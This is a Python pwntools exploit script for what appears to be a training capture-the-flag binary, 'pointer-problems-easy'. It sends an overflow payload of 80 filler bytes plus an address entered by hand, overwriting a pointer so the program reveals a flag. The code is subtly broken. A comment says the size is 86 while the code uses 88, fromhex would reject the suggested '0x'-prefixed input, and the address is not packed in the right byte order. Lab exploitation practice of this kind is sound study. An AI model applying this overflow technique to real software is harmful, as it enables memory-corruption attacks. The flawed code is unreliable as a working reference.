from pwn import *

context.arch = 'amd64'

p = process("/challenge/pointer-problems-easy")

# Let the program run until it shows everything and asks for payload size
output = p.recvuntil(b"Payload size:").decode()
print(output)

# The script pauses here for you to manually check the output
print("\n" + "="*50)
print("SCRIPT PAUSED - Check the output above to find:")
print("1. The password address (e.g., 0x7fff866022af)")
print("2. The password bytes at that address in the stack dump")
print("="*50)

# Get the password bytes from user input
flag_addr = input("\nEnter the flag address you observed: ").strip()

flag_addr_bytes = bytes.fromhex(flag_addr)

# Calculate size needed (always 86)
size_needed = 88

# Send the size
p.sendline(str(size_needed).encode())

payload = b'A' * 80 + flag_addr_bytes

# Wait for payload prompt
p.recvuntil(b"Send your payload")

# Construct and send payload
p.send(payload)

# Get the result
result = p.recvall(timeout=2).decode()
print("\n" + "="*50)
print("RESULT:")
print(result)
print("="*50)

